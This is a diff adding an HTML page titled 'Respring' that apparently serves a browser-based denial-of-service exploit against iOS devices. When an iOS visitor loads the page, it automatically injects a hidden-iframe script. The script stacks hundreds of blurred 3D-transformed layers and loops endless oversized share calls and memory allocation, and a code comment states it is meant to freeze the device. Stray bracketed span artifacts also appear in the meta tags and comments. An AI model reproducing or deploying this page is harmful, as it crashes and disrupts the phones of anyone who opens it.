@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Respring</title>
+        <meta name="description" content="Instant respring for iOS devices[span_1](start_span)[span_1](end_span)"/>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+        <meta property="og:title" content="Respring">
+        <meta property="og:description" content="Instant respring for iOS devices[span_2](start_span)[span_2](end_span)">
+        <meta name="theme-color" content="#1a0033">
+        
+        <style>
+            /* Glowing Gradient Background */
+            body, html {
+                margin: 0; 
+                padding: 0; 
+                width: 100%; 
+                height: 100%;
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                display: flex; 
+                align-items: center; 
+                justify-content: center;
+                overflow: hidden; 
+                background: linear-gradient(-45deg, #1a0033, #001a33, #330033, #00331a, #001a33);
+                background-size: 400% 400%;
+                animation: gradientBG 8s ease infinite;
+                color: #ffffff;
+                user-select: none;
+                -webkit-user-select: none;
+            }
+
+            @keyframes gradientBG {
+                0% { background-position: 0% 50%; }
+                50% { background-position: 100% 50%; }
+                100% { background-position: 0% 50%; }
+            }
+
+            /* Glassmorphism Card UI */
+            .glass-card {
+                background: rgba(255, 255, 255, 0.03);
+                backdrop-filter: blur(16px);
+                -webkit-backdrop-filter: blur(16px);
+                border: 1px solid rgba(255, 255, 255, 0.08);
+                border-radius: 24px;
+                padding: 50px 40px;
+                text-align: center;
+                box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5), 
+                            0 0 30px rgba(100, 200, 255, 0.1) inset;
+                display: none; /* Hidden until platform check completes */
+                flex-direction: column;
+                align-items: center;
+                max-width: 320px;
+                width: 80%;
+            }
+
+            /* Unsupported UI specific */
+            .glass-card h2 {
+                margin: 0 0 10px 0;
+                font-size: 1.4rem;
+                letter-spacing: 1px;
+                color: #ff5e5e;
+                text-shadow: 0 0 10px rgba(255, 94, 94, 0.4);
+            }
+            .glass-card p {
+                margin: 0;
+                color: #b3b3b3;
+                font-size: 0.95rem;
+                line-height: 1.5;
+            }
+
+            /* Loading UI specific */
+            .loading-text {
+                margin-top: 25px;
+                font-size: 1.1rem;
+                font-weight: 500;
+                letter-spacing: 2px;
+                color: rgba(255, 255, 255, 0.9);
+                animation: pulseText 1.5s ease-in-out infinite;
+            }
+
+            @keyframes pulseText {
+                0%, 100% { opacity: 0.6; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
+                50% { opacity: 1; text-shadow: 0 0 15px rgba(255,255,255,0.6); }
+            }
+
+            /* Glowing Spinner */
+            .glowing-spinner {
+                width: 50px;
+                height: 50px;
+                border: 3px solid transparent;
+                border-top-color: #00e5ff;
+                border-bottom-color: #b700ff;
+                border-radius: 50%;
+                animation: spinGlow 1s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
+                box-shadow: 0 0 20px rgba(0, 229, 255, 0.4), 
+                            inset 0 0 15px rgba(183, 0, 255, 0.4);
+            }
+
+            @keyframes spinGlow {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+
+        </style>
+    </head>
+    <body>
+        
+        <!-- Unsupported Device Card -->
+        <div id="unsupported" class="glass-card">
+            <h2>Unsupported</h2>
+            <p>This page uses an exploit meant specifically for iOS/iPadOS devices.</p>
+        </div>
+
+        <!-- Automatic Loading Card -->
+        <div id="loading" class="glass-card">
+            <div class="glowing-spinner"></div>
+            <div class="loading-text">RESPRINGING</div>
+        </div>
+
+        <!-- Hidden iframe for payload execution[span_3](start_span)[span_3](end_span) -->
+        <iframe id="frame" style="width: 1px; height: 1px; border: none; position: absolute; opacity: 0; pointer-events: none;" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>
+
+        <script>
+            // Platform Detection
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+            window.onload = () => {
+                if (!isIOS) {
+                    // Show unsupported UI
+                    document.getElementById('unsupported').style.display = 'flex';
+                } else {
+                    // Show automated loading UI
+                    document.getElementById('loading').style.display = 'flex';
+                    
+                    // Original payload from respring.html[span_4](start_span)[span_4](end_span)
+                    const frame = document.getElementById('frame');
+                    const respringScript = `
+                        <html>
+                        <body>
+                            <script>
+                                const container = document.createElement('div');
+                                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
+                                document.body.appendChild(container);
+            
+                                for (let i = 0; i < 500; i++) {
+                                    let d = document.createElement('div');
+                                    d.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
+                                    container.appendChild(d);
+                                }
+            
+                                setInterval(() => {
+                                    navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
+                                    let x = new Uint8Array(1024 * 1024 * 10);
+                                    crypto.getRandomValues(x);
+                                }, 0);
+                            <\/script>
+                        </body>
+                        </html>
+                    `;
+                    
+                    // Wait 400ms to allow the gradient background and glowing animations to render smoothly before freezing the device[span_5](start_span)[span_5](end_span)
+                    setTimeout(() => {
+                        frame.srcdoc = respringScript;
+                    }, 400);
+                }
+            };
+        </script>
+    </body>
+</html>
